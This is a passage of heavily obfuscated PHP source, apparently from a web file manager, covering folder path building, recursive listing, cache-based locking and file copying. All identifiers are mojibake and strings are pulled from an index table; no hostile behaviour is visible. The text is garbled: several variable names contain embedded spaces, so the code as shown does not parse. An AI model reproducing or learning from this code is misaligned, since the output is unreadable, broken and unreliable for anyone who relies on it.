(isset($ˆá¤ÃÃõ[$¯·¸ßÕ£[$óû›Ü–°[194]]])) { $­à×ó’‰ = $ˆá¤ÃÃõ[$¯·¸ßÕ£[$óû›Ü–°[194]]]; if (!is_array($¯·¸ßÕ£[$óû›Ü–°[552]])) { $¯·¸ßÕ£[$óû›Ü–°[552]] = array(); } $¯·¸ßÕ£[$óû›Ü–°[552]][$óû›Ü–°[592]] = $­à×ó’‰[$óû›Ü–°[587]]; $¯·¸ßÕ£[$óû›Ü–°[498]][$óû›Ü–°[593]] = $­à×ó’‰; $¯·¸ßÕ£[$óû›Ü–°[498]][$óû›Ü–°[594]] = $¯·¸ßÕ£[$óû›Ü–°[595]]; $¯·¸ßÕ£[$óû›Ü–°[498]][$óû›Ü–°[596]] = $óû›Ü–°[91]; if ($­à×ó’‰[$óû›Ü–°[538]] != $äÊö¬ÑÁ) { $¯·¸ßÕ£[$óû›Ü–°[498]][$óû›Ü–°[499]] = $¯·¸ßÕ£[$óû›Ü–°[498]][$óû›Ü–°[499]] & $­à×ó’‰[$óû›Ü–°[498]][$óû›Ü–°[498]]; } continue; } $ÛãÛÑ® = $this->parentLevelArray($¯·¸ßÕ£[$óû›Ü–°[597]]); $µ”ˆ’Á´ = array_reverse($ÛãÛÑ®); foreach ($µ”ˆ’Á´ as $Öæû´›Î => $¡»¸ò´’) { if (!isset($ˆá¤ÃÃõ[$¡»¸ò´’])) { continue; } $­à×ó’‰ = $ˆá¤ÃÃõ[$¡»¸ò´’]; $¯·¸ßÕ£[$óû›Ü–°[498]][$óû›Ü–°[593]] = $­à×ó’‰; if ($­à×ó’‰[$óû›Ü–°[538]] != $äÊö¬ÑÁ) { $¯·¸ßÕ£[$óû›Ü–°[498]][$óû›Ü–°[499]] = $¯·¸ßÕ£[$óû›Ü–°[498]][$óû›Ü–°[499]] & $­à×ó’‰[$óû›Ü–°[498]][$óû›Ü–°[498]]; } $å˜ÜÏŞ¼ = $óû›Ü–°[12]; $á‘Œ¤œ = count($ÛãÛÑ®) - $Öæû´›Î; for ($´¥‹¨ªÊ = 0; $´¥‹¨ªÊ < $á‘Œ¤œ; $´¥‹¨ªÊ++) { if (!isset($´¿„Ë¯à[$ÛãÛÑ®[$´¥‹¨ªÊ]])) { $å˜ÜÏŞ¼ = $óû›Ü–°[12]; break; } $å˜ÜÏŞ¼ = $å˜ÜÏŞ¼ . rtrim($´¿„Ë¯à[$ÛãÛÑ®[$´¥‹¨ªÊ]], $óû›Ü–°[8]) . $óû›Ü–°[8]; } $¯·¸ßÕ£[$óû›Ü–°[498]][$óû›Ü–°[594]] = rtrim($å˜ÜÏŞ¼, $óû›Ü–°[8]) . $óû›Ü–°[8]; break; } } unset($¯·¸ßÕ£); } public function groupPathDisplay(&$Ìò’Ë) { $½€ã•Ìı =& $_SERVER[äô®•½Â]; if ($Ìò’Ë[$½€ã•Ìı[191]] != self::TYPE_GROUP) { return; } $æğáëÒ¤ = Model($½€ã•Ìı[598])->getInfo($Ìò’Ë[$½€ã•Ìı[582]]); $Êƒò¶ä‚ = $this->parentLevelArray($æğáëÒ¤[$½€ã•Ìı[597]]); $Âªó€Ô = $½€ã•Ìı[12]; foreach ($Êƒò¶ä‚ as $‚·«³ê‘) { $ùÍÜ…£— = Model($½€ã•Ìı[598])->getInfo($‚·«³ê‘); $Âªó€Ô .= $ùÍÜ…£—[$½€ã•Ìı[90]][$½€ã•Ìı[194]] . $½€ã•Ìı[50]; } $Ìò’Ë[$½€ã•Ìı[599]] = $æğáëÒ¤[$½€ã•Ìı[193]]; $Ìò’Ë[$½€ã•Ìı[600]] = $æğáëÒ¤[$½€ã•Ìı[597]]; $Ìò’Ë[$½€ã•Ìı[601]] = $æğáëÒ¤[$½€ã•Ìı[602]]; $Ìò’Ë[$½€ã•Ìı[603]] = $Âªó€Ô . $æğáëÒ¤[$½€ã•Ìı[90]][$½€ã•Ìı[194]]; } protected function _listAppendPath(&$ìŒª“´ß, $é‡±˜Ö÷ = false) { $‹Ùç½ì =& $_SERVER[äô®•½Â]; static $òŒŠçãµ = array(); $¡†Ó¼¯Á = array(); $‡×¦êô = array(); if ($é‡±˜Ö÷) { return $òŒŠçãµ; } foreach ($ìŒª“´ß as &$§ı‚¾Ü) { $è‡¦‹ß = $§ı‚¾Ü[$‹Ùç½ì[194]]; if ($§ı‚¾Ü[$‹Ùç½ì[496]] == $‹Ùç½ì[91] && $§ı‚¾Ü[$‹Ùç½ì[193]] != 0) { $òŒŠçãµ[$è‡¦‹ß] = $§ı‚¾Ü[$‹Ùç½ì[32]]; } if ($§ı‚¾Ü[$‹Ùç½ì[496]] == $‹Ùç½ì[91] && $§ı‚¾Ü[$‹Ùç½ì[193]] == 0) { $òŒŠçãµ[$è‡¦‹ß] = $this->_listAppendPathRoot($§ı‚¾Ü, array()); } if (isset($‡×¦êô[$§ı‚¾Ü[$‹Ùç½ì[597]]])) { continue; } $‡×¦êô[$§ı‚¾Ü[$‹Ùç½ì[597]]] = !0; $ùñù¥ñ« = $this->parentLevelArray($§ı‚¾Ü[$‹Ùç½ì[597]]); foreach ($ùñù¥ñ« as $ÅÑŸ Ëå => $¯ØåşĞ¦) { if (isset($òŒŠçãµ[$¯ØåşĞ¦])) { continue; } if ($ÅÑŸ Ëå == 0) { $òŒŠçãµ[$¯ØåşĞ¦] = $this->_listAppendPathRoot($§ı‚¾Ü, $ùñù¥ñ«); } if ($ÅÑŸ Ëå != 0) { $¡†Ó¼¯Á[] = $¯ØåşĞ¦; } } } unset($§ı‚¾Ü); $¡†Ó¼¯Á = array_unique($¡†Ó¼¯Á); if (count($¡†Ó¼¯Á) > 0) { $”àò°¢ = array($‹Ùç½ì[502] => array($‹Ùç½ì[503], $¡†Ó¼¯Á)); if (count($¡†Ó¼¯Á) == 1) { $ï‡·î¾ = $this->sourceInfo($¡†Ó¼¯Á[0]); $Š‰ûØùä = is_array($ï‡·î¾) ? array($ï‡·î¾) : !1; } else { $Š‰ûØùä = $this->field($‹Ùç½ì[604])->where($”àò°¢)->select(); } if (!$Š‰ûØùä) { $Š‰ûØùä = array(); } foreach ($Š‰ûØùä as $ÙÕÅ„Ì°) { $òŒŠçãµ[$ÙÕÅ„Ì°[$‹Ùç½ì[194]]] = $ÙÕÅ„Ì°[$‹Ùç½ì[32]]; } } $İ­ùÀ± = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $—å¯˜» = array(); foreach ($ìŒª“´ß as &$§ı‚¾Ü) { $§®¨èÉ¾ = $§ı‚¾Ü[$‹Ùç½ì[597]]; $Ê¦ú‚Ü¦ = $‹Ùç½ì[12]; if (isset($—å¯˜»[$§®¨èÉ¾])) { $Ê¦ú‚Ü¦ = $—å¯˜»[$§®¨èÉ¾]; } else { $ùñù¥ñ« = $this->parentLevelArray($§ı‚¾Ü[$‹Ùç½ì[597]]); foreach ($ùñù¥ñ« as $ÅÑŸ Ëå => $¯ØåşĞ¦) { if (isset($òŒŠçãµ[$¯ØåşĞ¦])) { $Ê¦ú‚Ü¦ .= $òŒŠçãµ[$¯ØåşĞ¦] . $‹Ùç½ì[8]; } } $—å¯˜»[$§®¨èÉ¾] = $Ê¦ú‚Ü¦; } $Ê¦ú‚Ü¦ .= $§ı‚¾Ü[$‹Ùç½ì[32]]; if ($§ı‚¾Ü[$‹Ùç½ì[496]] == $‹Ùç½ì[91]) { $Ê¦ú‚Ü¦ .= $‹Ùç½ì[8]; } $§ı‚¾Ü[$‹Ùç½ì[595]] = str_replace($‹Ùç½ì[257], $‹Ùç½ì[8], $Ê¦ú‚Ü¦); if ($§ı‚¾Ü[$‹Ùç½ì[193]] == $‹Ùç½ì[231]) { $§ı‚¾Ü[$‹Ùç½ì[32]] = trim($òŒŠçãµ[$§ı‚¾Ü[$‹Ùç½ì[194]]], $‹Ùç½ì[8]); $§ı‚¾Ü[$‹Ùç½ì[595]] = $§ı‚¾Ü[$‹Ùç½ì[32]] . $‹Ùç½ì[8]; } if (intval($§ı‚¾Ü[$‹Ùç½ì[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($§ı‚¾Ü, $ùñù¥ñ«, $İ­ùÀ±); } } unset($§ı‚¾Ü); return $ìŒª“´ß; } private function _listAppendPathRecycle(&$î¿şÅ•ë, $—ÕáÑ¶±, $µÆ°³ô™) { $±¦Şİâ‹ =& $_SERVER[äô®•½Â]; if (!in_array($µÆ°³ô™, $—ÕáÑ¶±) && $î¿şÅ•ë[$±¦Şİâ‹[194]] != $µÆ°³ô™) { return; } $¸”™ğøÚ = explode($±¦Şİâ‹[8], trim($î¿şÅ•ë[$±¦Şİâ‹[595]], $±¦Şİâ‹[8])); $š’ìí¾ = implode($±¦Şİâ‹[8], array_slice($¸”™ğøÚ, 2)); $î¿şÅ•ë[$±¦Şİâ‹[595]] = $±¦Şİâ‹[8] . LNG($±¦Şİâ‹[605]) . $±¦Şİâ‹[8] . ltrim($š’ìí¾, $±¦Şİâ‹[8]); $î¿şÅ•ë[$±¦Şİâ‹[597]] = $±¦Şİâ‹[606] . implode($±¦Şİâ‹[50], array_slice($—ÕáÑ¶±, 1)) . $±¦Şİâ‹[50]; if ($î¿şÅ•ë[$±¦Şİâ‹[194]] == $µÆ°³ô™) { $î¿şÅ•ë[$±¦Şİâ‹[597]] = $±¦Şİâ‹[606]; $î¿şÅ•ë[$±¦Şİâ‹[193]] = $±¦Şİâ‹[231]; $î¿şÅ•ë[$±¦Şİâ‹[32]] = LNG($±¦Şİâ‹[605]); } $î¿şÅ•ë[$±¦Şİâ‹[607]] = $±¦Şİâ‹[608]; } protected function _listAppendPathRoot(&$²˜Á§†¢, $ŞŒöŞŒı) { $©ˆÊĞùß =& $_SERVER[äô®•½Â]; static $µÈ»ú’° = false; static $ÓÉîê¸ = false; $ı°¼Òã† = $©ˆÊĞùß[12]; if ($²˜Á§†¢[$©ˆÊĞùß[191]] == self::TYPE_USER) { if ($²˜Á§†¢[$©ˆÊĞùß[582]] == USER_ID) { $ı°¼Òã† = LNG($©ˆÊĞùß[609]); if ($µÈ»ú’° === !1) { $Ê¹¦¦‰£ = Model($©ˆÊĞùß[610])->getInfoFull(USER_ID); $µÈ»ú’° = _get($Ê¹¦¦‰£, $©ˆÊĞùß[611], $©ˆÊĞùß[12]); } if ($ÓÉîê¸ === !1) { $Ê¹¦¦‰£ = Model($©ˆÊĞùß[610])->getInfoFull(USER_ID); $ÓÉîê¸ = _get($Ê¹¦¦‰£, $©ˆÊĞùß[612], $©ˆÊĞùß[12]); } if ($ŞŒöŞŒı && $ŞŒöŞŒı[0] == $µÈ»ú’° || !$ŞŒöŞŒı && $²˜Á§†¢[$©ˆÊĞùß[194]] == $µÈ»ú’°) { $ı°¼Òã† = LNG($©ˆÊĞùß[613]); $²˜Á§†¢[$©ˆÊĞùß[614]] = $©ˆÊĞùß[615]; } if ($ŞŒöŞŒı && $ŞŒöŞŒı[0] == $ÓÉîê¸ || !$ŞŒöŞŒı && $²˜Á§†¢[$©ˆÊĞùß[194]] == $ÓÉîê¸) { $ı°¼Òã† = $ı°¼Òã† . $©ˆÊĞùß[616] . LNG($©ˆÊĞùß[617]); } if (!$ŞŒöŞŒı) { $²˜Á§†¢[$©ˆÊĞùß[32]] = $ı°¼Òã†; } } else { $Ê¹¦¦‰£ = Model($©ˆÊĞùß[610])->getInfoFull($²˜Á§†¢[$©ˆÊĞùß[582]]); $ÊÛçûñ = _get($Ê¹¦¦‰£, $©ˆÊĞùß[612], $©ˆÊĞùß[12]); $²˜Á§†¢[$©ˆÊĞùß[618]] = Model($©ˆÊĞùß[590])->getInfoSimpleOuter($²˜Á§†¢[$©ˆÊĞùß[582]]); $ı°¼Òã† = LNG($©ˆÊĞùß[619]) . $©ˆÊĞùß[176] . $²˜Á§†¢[$©ˆÊĞùß[618]][$©ˆÊĞùß[32]] . $©ˆÊĞùß[178]; if ($ŞŒöŞŒı && $ŞŒöŞŒı[0] == $ÊÛçûñ || !$ŞŒöŞŒı && $²˜Á§†¢[$©ˆÊĞùß[194]] == $ÊÛçûñ) { $ı°¼Òã† = LNG($©ˆÊĞùß[619]) . $©ˆÊĞùß[620] . $²˜Á§†¢[$©ˆÊĞùß[618]][$©ˆÊĞùß[32]] . $©ˆÊĞùß[616] . LNG($©ˆÊĞùß[617]) . $©ˆÊĞùß[178]; } } } else { if ($²˜Á§†¢[$©ˆÊĞùß[191]] == self::TYPE_GROUP) { $¡…‹¼¤Á = Model($©ˆÊĞùß[598])->getInfoSimple($²˜Á§†¢[$©ˆÊĞùß[582]]); $ı°¼Òã† = $¡…‹¼¤Á[$©ˆÊĞùß[32]]; } else { if ($²˜Á§†¢[$©ˆÊĞùß[191]] == self::TYPE_SYSTEM) { $ı°¼Òã† = $©ˆÊĞùß[621]; } } } $ı°¼Òã† = $ı°¼Òã† ? $©ˆÊĞùß[8] . $ı°¼Òã† . $©ˆÊĞùß[8] : $©ˆÊĞùß[8]; return $ı°¼Òã†; } protected function _listAppendUser(&$éÕ©Üİğ) { $—àÖÙº³ =& $_SERVER[äô®•½Â]; $¶Æ©¤ûö = array_to_keyvalue($éÕ©Üİğ, $—àÖÙº³[12], $—àÖÙº³[538]); $«Ÿ‚Ùéä = array_to_keyvalue($éÕ©Üİğ, $—àÖÙº³[12], $—àÖÙº³[540]); $šù¤ŠÉ = array_merge($¶Æ©¤ûö, $«Ÿ‚Ùéä); $Ñº˜•ìå = Model($—àÖÙº³[610])->userListInfo($šù¤ŠÉ); foreach ($éÕ©Üİğ as &$ÇÚ‚Ÿ²³) { $Íèù¹±¨ = $ÇÚ‚Ÿ²³[$—àÖÙº³[538]]; $ÇÚ‚Ÿ²³[$—àÖÙº³[538]] = $Ñº˜•ìå[$Íèù¹±¨] ? $Ñº˜•ìå[$Íèù¹±¨] : !1; $Íèù¹±¨ = $ÇÚ‚Ÿ²³[$—àÖÙº³[540]]; $ÇÚ‚Ÿ²³[$—àÖÙº³[540]] = $Ñº˜•ìå[$Íèù¹±¨] ? $Ñº˜•ìå[$Íèù¹±¨] : !1; if (_get($ÇÚ‚Ÿ²³, $—àÖÙº³[622], 0)) { $—²¼Ÿ = $GLOBALS[$—àÖÙº³[6]][$—àÖÙº³[92]][$—àÖÙº³[623]]; if ($ÇÚ‚Ÿ²³[$—àÖÙº³[552]][$—àÖÙº³[624]] <= time() - $—²¼Ÿ) { $this->metaSet($ÇÚ‚Ÿ²³[$—àÖÙº³[194]], $—àÖÙº³[625], null); $this->metaSet($ÇÚ‚Ÿ²³[$—àÖÙº³[194]], $—àÖÙº³[624], null); unset($ÇÚ‚Ÿ²³[$—àÖÙº³[552]][$—àÖÙº³[625]]); continue; } $ı¬¹ßÉä = $ÇÚ‚Ÿ²³[$—àÖÙº³[552]][$—àÖÙº³[625]]; $ÇÚ‚Ÿ²³[$—àÖÙº³[552]][$—àÖÙº³[626]] = Model($—àÖÙº³[610])->getInfoSimpleOuter($ı¬¹ßÉä); } } unset($ÇÚ‚Ÿ²³); } public function parentLevelArray($­°Ù½¤×) { $Øê€­º’ =& $_SERVER[äô®•½Â]; $­°Ù½¤× = explode($Øê€­º’[50], trim($­°Ù½¤×, $Øê€­º’[50])); return array_to_int(array_filter($­°Ù½¤×)); } public function listAll($™ÆüÊÅ) { $äÉÁŠ·‚ =& $_SERVER[äô®•½Â]; $´ŠÑ‹ï = $this->sourceInfo($™ÆüÊÅ); $§îîœÓÜ = array($äÉÁŠ·‚[627] => array($äÉÁŠ·‚[628], $´ŠÑ‹ï[$äÉÁŠ·‚[597]] . $™ÆüÊÅ . $äÉÁŠ·‚[629]), $äÉÁŠ·‚[630] => 0); $ÏëÊ‹å¸ = $äÉÁŠ·‚[631]; $ŒÀüá‘â = "\114\x45\x46\124\40\112\117\x49\x4e\40{$this->tablePrefix}\151\157\x5f\146\151\x6c\145\x20\x66\151\x6c\x65\x20\x6f\x6e\x20\163\x6f\x75\162\143\145\56\146\151\x6c\145\x49\x44\40\75\40\146\151\x6c\145\x2e\x66\x69\154\x65\111\x44"; $®ü’Îµú = $this->alias($äÉÁŠ·‚[530])->field($ÏëÊ‹å¸)->where($§îîœÓÜ)->join($ŒÀüá‘â)->select(); $this->_listAppendAuth($®ü’Îµú); $this->_listAppendUser($®ü’Îµú); $this->_listAppendPath($®ü’Îµú); $®ü’Îµú = array_to_keyvalue($®ü’Îµú, $äÉÁŠ·‚[194]); $â®‹›Úş = "\x2f{$´ŠÑ‹ï[$äÉÁŠ·‚[32]]}\57"; $â®‹›Úş = $â®‹›Úş == $äÉÁŠ·‚[257] ? $äÉÁŠ·‚[8] : $â®‹›Úş; $€Şã§‘  = array(); foreach ($®ü’Îµú as $üÎÄ‘à => $Şáò°˜‡) { $¦‘ÅÚ¢ = $this->parentLevelArray($Şáò°˜‡[$äÉÁŠ·‚[597]]); array_shift($¦‘ÅÚ¢); $àà²‡Ö¯ = $â®‹›Úş; for ($÷é·à€¬ = 0; $÷é·à€¬ < count($¦‘ÅÚ¢); $÷é·à€¬++) { $àà²‡Ö¯ .= $®ü’Îµú[$¦‘ÅÚ¢[$÷é·à€¬]][$äÉÁŠ·‚[32]] . $äÉÁŠ·‚[8]; } $àà²‡Ö¯ .= $Şáò°˜‡[$äÉÁŠ·‚[32]]; if ($Şáò°˜‡[$äÉÁŠ·‚[496]]) { $àà²‡Ö¯ .= $äÉÁŠ·‚[8]; } $ŒâÌ¡Õõ = array($äÉÁŠ·‚[506] => str_replace($äÉÁŠ·‚[257], $äÉÁŠ·‚[8], str_replace($äÉÁŠ·‚[257], $äÉÁŠ·‚[8], str_replace($äÉÁŠ·‚[257], $äÉÁŠ·‚[8], $àà²‡Ö¯))), $äÉÁŠ·‚[632] => intval($Şáò°˜‡[$äÉÁŠ·‚[496]]), $äÉÁŠ·‚[633] => intval($Şáò°˜‡[$äÉÁŠ·‚[79]]), $äÉÁŠ·‚[88] => intval($Şáò°˜‡[$äÉÁŠ·‚[88]]), $äÉÁŠ·‚[90] => $this->pathInfoFilter($Şáò°˜‡)); if (!$ŒâÌ¡Õõ[$äÉÁŠ·‚[496]]) { $ŒâÌ¡Õõ[$äÉÁŠ·‚[554]] = $Şáò°˜‡[$äÉÁŠ·‚[554]]; } $€Şã§‘ [] = $ŒâÌ¡Õõ; } $€Şã§‘  = array_sort_by($€Şã§‘ , $äÉÁŠ·‚[87]); return $€Şã§‘ ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÃÑ¯²¬®) { $µ¢ ÜçÛ =& $_SERVER[äô®•½Â]; if (!$this->allowLock()) { return; } $this->_lockCheck($µ¢ ÜçÛ[634], $ÃÑ¯²¬®); $ÓÏö”›ª = 1; $this->_lockEvent($ÃÑ¯²¬®, array($µ¢ ÜçÛ[635], $µ¢ ÜçÛ[636]), $ÓÏö”›ª); $this->_lockParent($ÃÑ¯²¬®, array($µ¢ ÜçÛ[636]), $ÓÏö”›ª); $this->_lockEvent($ÃÑ¯²¬®, array($µ¢ ÜçÛ[637], $µ¢ ÜçÛ[638]), $ÓÏö”›ª); $this->_lockCheckEnd($µ¢ ÜçÛ[634], $ÃÑ¯²¬®); } public function lockCopyEnd($ÖÅ¨Š) { $ŒÊøãø¶ =& $_SERVER[äô®•½Â]; if (!$this->allowLock()) { return; } $¢òå±ğ¬ = 0; $this->_lockEvent($ÖÅ¨Š, array($ŒÊøãø¶[635], $ŒÊøãø¶[636]), $¢òå±ğ¬); $this->_lockParent($ÖÅ¨Š, array($ŒÊøãø¶[636]), $¢òå±ğ¬); $this->_lockEvent($ÖÅ¨Š, array($ŒÊøãø¶[637], $ŒÊøãø¶[638]), $¢òå±ğ¬); } public function lockWriteStart($»Úñ™Şü, $ô ”ìÀ£ = '') { $Şª‘Ä‘ =& $_SERVER[äô®•½Â]; if (!$this->allowLock()) { return; } $this->_lockCheck($Şª‘Ä‘[635], $»Úñ™Şü); $ûèŞÍÙ« = 1; $this->_lockKey($Şª‘Ä‘[639] . $»Úñ™Şü . $Şª‘Ä‘[10] . $ô ”ìÀ£, $ûèŞÍÙ«); $this->_lockEvent($»Úñ™Şü, array($Şª‘Ä‘[634], $Şª‘Ä‘[636]), $ûèŞÍÙ«); $this->_lockParent($»Úñ™Şü, array($Şª‘Ä‘[634], $Şª‘Ä‘[636]), $ûèŞÍÙ«); $this->_lockCheckEnd($Şª‘Ä‘[635], $»Úñ™Şü); } public function lockWriteEnd($¶…‚†÷, $ÖÁØïöµ = '') { $ÍëöŒ¯Ô =& $_SERVER[äô®•½Â]; if (!$this->allowLock()) { return; } $ª‘‰¦Àµ = 0; $this->_lockKey($ÍëöŒ¯Ô[639] . $¶…‚†÷ . $ÍëöŒ¯Ô[10] . $ÖÁØïöµ, $ª‘‰¦Àµ); $this->_lockEvent($¶…‚†÷, array($ÍëöŒ¯Ô[634], $ÍëöŒ¯Ô[636]), $ª‘‰¦Àµ); $this->_lockParent($¶…‚†÷, array($ÍëöŒ¯Ô[634], $ÍëöŒ¯Ô[636]), $ª‘‰¦Àµ); } public function lockMoveStart($Ç¾¯´‡Î) { $Ö·…¤ =& $_SERVER[äô®•½Â]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ö·…¤[636], $Ç¾¯´‡Î); $ÇãÈŠ´´ = 1; $this->_lockKey($Ö·…¤[640] . $Ç¾¯´‡Î, $ÇãÈŠ´´); $this->_lockEvent($Ç¾¯´‡Î, array($Ö·…¤[634], $Ö·…¤[635]), $ÇãÈŠ´´); $this->_lockParent($Ç¾¯´‡Î, array($Ö·…¤[634], $Ö·…¤[636]), $ÇãÈŠ´´); $this->_lockEvent($Ç¾¯´‡Î, array($Ö·…¤[641], $Ö·…¤[637], $Ö·…¤[638]), $ÇãÈŠ´´); $this->_lockCheckEnd($Ö·…¤[636], $Ç¾¯´‡Î); } public function lockMoveEnd($Óş³…ùæ) { $‡Ó¦³–ç =& $_SERVER[äô®•½Â]; if (!$this->allowLock()) { return; } $ØâŠ¤©ó = 0; $this->_lockKey($‡Ó¦³–ç[640] . $Óş³…ùæ, $ØâŠ¤©ó); $this->_lockEvent($Óş³…ùæ, array($‡Ó¦³–ç[634], $‡Ó¦³–ç[635]), $ØâŠ¤©ó); $this->_lockParent($Óş³…ùæ, array($‡Ó¦³–ç[634], $‡Ó¦³–ç[636]), $ØâŠ¤©ó); $this->_lockEvent($Óş³…ùæ, array($‡Ó¦³–ç[641], $‡Ó¦³–ç[637], $‡Ó¦³–ç[638]), $ØâŠ¤©ó); } private function _lockCheck($à‡Ï–·ò, $ŠªÏ·°€) { $öáŠ²Ü· =& $_SERVER[äô®•½Â]; $ØÕı£ø± = $this->sourceInfo($ŠªÏ·°€); $Íİ‘Ã€Â = $à‡Ï–·ò . $öáŠ²Ü·[10] . $ŠªÏ·°€; $this->_lockTimeStart[$Íİ‘Ã€Â] = timeFloat(); if (!is_array($ØÕı£ø±)) { return; } $·é°¸¿ = LNG($öáŠ²Ü·[642]); CacheLock::setErrorMsg($öáŠ²Ü·[176] . htmlspecialchars($ØÕı£ø±[$öáŠ²Ü·[32]]) . $öáŠ²Ü·[178] . $·é°¸¿); $this->_lockKey($Íİ‘Ã€Â, 1); $this->_lockKey($Íİ‘Ã€Â, 0); $±›’†ŞÒ = array_reverse($this->parentLevelArray($ØÕı£ø±[$öáŠ²Ü·[597]])); foreach ($±›’†ŞÒ as $ÔŸıò¶) { $Íİ‘Ã€Â = $à‡Ï–·ò . $öáŠ²Ü·[643] . $ÔŸıò¶; if (CacheLock::lockGet($öáŠ²Ü·[644] . $Íİ‘Ã€Â)) { $ØÕı£ø± = $this->sourceInfo($ÔŸıò¶); CacheLock::setErrorMsg($öáŠ²Ü·[176] . htmlspecialchars($ØÕı£ø±[$öáŠ²Ü·[32]]) . $öáŠ²Ü·[178] . $·é°¸¿); $this->_lockKey($Íİ‘Ã€Â, 1); $this->_lockKey($Íİ‘Ã€Â, 0); } } } private function _lockCheckEnd($÷–ÒÃÅ, $™ˆøêŒ) { $ı»¹‹ò =& $_SERVER[äô®•½Â]; $÷Ùêú™À = $÷–ÒÃÅ . $ı»¹‹ò[10] . $™ˆøêŒ; CacheLock::setErrorMsg($ı»¹‹ò[465]); if (!isset($this->_lockTimeStart[$÷Ùêú™À])) { return; } $Ü÷çºÀÔ = timeFloat() - $this->_lockTimeStart[$÷Ùêú™À]; unset($this->_lockTimeStart[$÷Ùêú™À]); if ($Ü÷çºÀÔ > 0.5) { unset(self::$cacheSourceInfo[$ı»¹‹ò[544] . $™ˆøêŒ]); } $©Ûß ØÖ = $this->sourceInfo($™ˆøêŒ); if (!$©Ûß ØÖ) { show_json(LNG($ı»¹‹ò[108]), !1); } } private function _lockParent($ëŞ¢×¸•, $ÜŒ‹«û†, $Œ›ùş‰) { if (!$this->autoLockSet) { return; } $úğøäœù = $this->sourceInfo($ëŞ¢×¸•); if (!is_array($úğøäœù)) { return; } $ÙÊö’üÖ = array_reverse($this->parentLevelArray($úğøäœù[$_SERVER[äô®•½Â][597]])); foreach ($ÙÊö’üÖ as $İŒëö‡ƒ) { $this->_lockEvent($İŒëö‡ƒ, $ÜŒ‹«û†, $Œ›ùş‰); } } private function _lockEvent($‘Ââ¸, $†ƒ•ëÖÔ, $Ïı¡¹†å) { $÷¨ÃÒ‹¤ =& $_SERVER[äô®•½Â]; if (!$this->autoLockSet) { return; } foreach ($†ƒ•ëÖÔ as $×ŠèˆÊ¾) { $áÙ²¬¬ = $×ŠèˆÊ¾ . $÷¨ÃÒ‹¤[10] . $‘Ââ¸; if ($Ïı¡¹†å && CacheLock::lockGet($÷¨ÃÒ‹¤[644] . $áÙ²¬¬)) { continue; } $this->_lockKey($áÙ²¬¬, $Ïı¡¹†å); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ëÒ¿Ÿå³, $œ¦ô»ş = 1) { $¬¨¦Àåƒ = $_SERVER[äô®•½Â][644] . md5($ëÒ¿Ÿå³); if ($œ¦ô»ş) { if (isset(self::$_lockItemArr[$¬¨¦Àåƒ])) { return; } self::$_lockItemArr[$¬¨¦Àåƒ] = 1; CacheLock::lock($¬¨¦Àåƒ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¬¨¦Àåƒ])) { return; } unset(self::$_lockItemArr[$¬¨¦Àåƒ]); CacheLock::unlock($¬¨¦Àåƒ); } } public function isParentOf($¯…Ô˜›’, $™ß‘©‚Ã) { $ÌÒ˜öÎÃ =& $_SERVER[äô®•½Â]; $ß™œß»° = $this->sourceInfo($¯…Ô˜›’); $Î¨»ßÜ = $this->sourceInfo($™ß‘©‚Ã); $êäƒŸ²ƒ = $ß™œß»°[$ÌÒ˜öÎÃ[597]] . $ß™œß»°[$ÌÒ˜öÎÃ[194]] . $ÌÒ˜öÎÃ[50]; $—ñíïàù = $Î¨»ßÜ[$ÌÒ˜öÎÃ[597]] . $Î¨»ßÜ[$ÌÒ˜öÎÃ[194]] . $ÌÒ˜öÎÃ[50]; $şßªÓã· = strpos($—ñíïàù, $êäƒŸ²ƒ) === 0; return $şßªÓã·; } private $targetIsDelete = 0; public function copy($«À­Ú°™, $¿©”¢µâ, $ÓˆÁş»Ù = REPEAT_REPLACE, $áÜœ»Á = '') { $¸š¹ù½Î =& $_SERVER[äô®•½Â]; $Ì¤¨Õ” = $this->sourceInfo($«À­Ú°™); $ğŸæò“ñ = $this->sourceInfo($¿©”¢µâ); if (!$Ì¤¨Õ” || !$ğŸæò“ñ || $ğŸæò“ñ[$¸š¹ù½Î[496]] != $¸š¹ù½Î[91]) { return !1; } if ($this->isParentOf($«À­Ú°™, $¿©”¢µâ)) { return !1; } $£€ãöÏ¹ = $áÜœ»Á ? $áÜœ»Á : $Ì¤¨Õ”[$¸š¹ù½Î[32]]; $this->lockCopyStart($«À­Ú°™); $this->lockWriteStart($¿©”¢µâ, $£€ãöÏ¹); $¥ì×—ã = array($¸š¹ù½Î[645] => array(), $¸š¹ù½Î[646] => array(), $¸š¹ù½Î[647] => array()); $this->targetIsDelete = intval($Ì¤¨Õ”[$¸š¹ù½Î[516]]); $ˆáÄÎ“ß = $this->fileNameExistAuto($¿©”¢µâ, $Ì¤¨Õ”); $â•şïÅ‰ = $this->_copy($«À­Ú°™, $¿©”¢µâ, $ÓˆÁş»Ù, $¥ì×—ã, !0, $áÜœ»Á); $this->_childrenListClear(); $this->lockCopyEnd($«À­Ú°™); $this->lockWriteEnd($¿©”¢µâ, $£€ãöÏ¹); if ($Ì¤¨Õ”[$¸š¹ù½Î[496]] == $¸š¹ù½Î[91] && $ˆáÄÎ“ß == $â•şïÅ‰) { $this->folderSizeResetChildren($ˆáÄÎ“ß); } Model($¸š¹ù½Î[648])->addAll($¥ì×—ã[$¸š¹ù½Î[646]], array(), !0); if ($ˆáÄÎ“ß != $â•şïÅ‰ || $Ì¤¨Õ”[$¸š¹ù½Î[496]] == $¸š¹ù½Î[91]) { Model($¸š¹ù½Î[649])->eventCopy($â•şïÅ‰); } $this->saveAll($¥ì×—ã[$¸š¹ù½Î[647]]); Model($¸š¹ù½Î[233])->linkAdd($¥ì×—ã[$¸š¹ù½Î[645]]); $this->folderSizeReset($¿©”¢µâ); $this->updateModifyTime($¿©”¢µâ); return $â•şïÅ‰; } private function _copy($­Ÿ¬Õï‚, $ƒØµİìÙ, $²­Ò¶´, &$šòÅï¿ã, $ÄàÃŠÉ­, $é­êÏ“ì = '') { $ãĞ£şí  =& $_SERVER[äô®•½Â]; $ºÏÉõ¼À = $this->sourceInfoCache($­Ÿ¬Õï‚); $ä¨¶ı·ğ = $ºÏÉõ¼À[$ãĞ£şí [496]] == $ãĞ£şí [91]; $àµ©§Æ€ = 